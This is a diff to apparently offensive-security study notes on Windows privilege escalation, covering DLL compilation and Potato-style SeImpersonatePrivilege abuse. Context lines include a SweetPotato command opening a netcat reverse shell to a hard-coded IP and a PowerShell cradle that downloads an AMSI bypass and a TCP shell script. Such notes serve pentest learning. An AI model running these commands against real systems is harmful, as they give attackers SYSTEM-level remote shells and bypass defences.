@@ -160,7 +160,7 @@ LPVOID lpReserved ) // Reserved
 }
 ```
 
-Now we can compile the dll with the following command: 
+Now we can compile the dll with the following command: (IF *cc1plus* error in kali: `sudo apt install mingw-w64`)
 ```bash
 x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
 ```
@@ -305,6 +305,7 @@ C:\Users\steve\Pictures\BackendCacheCleanup.exe NT AUTHORITY\SYSTEM:(I)(F)
 We have permission so we can place a malicious binary file
 
 #### Kernel Exploits
+**Potatoes**: https://jlajara.gitlab.io/Potatoes_Windows_Privesc
 
 Privileges that may lead to privilege escalation are _SeBackupPrivilege_, _SeAssignPrimaryToken_, _SeLoadDriver_, and _SeDebug_. We will be abusing SeImpersonatePrivilege.
 
@@ -346,6 +347,12 @@ Sweetpotato examples:
 ```shell
 .\SweetPotato.exe -a "C:\tools\nc.exe -e cmd.exe 192.168.45.210 1234"
 ./SweetPotato.exe -a "/c powershell.exe iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/amsi.txt'); iex (New-Object Net.WebClient).DownloadString('http://<IP>:8090/Invoke-PowerShellTcp2.ps1')"
+```
+
+Godpotato examples:
+```
+GodPotato -cmd "cmd /c whoami"
+GodPotato -cmd "cmd /c whoami"
 ```
 
 **SeBackupPrivilege**:
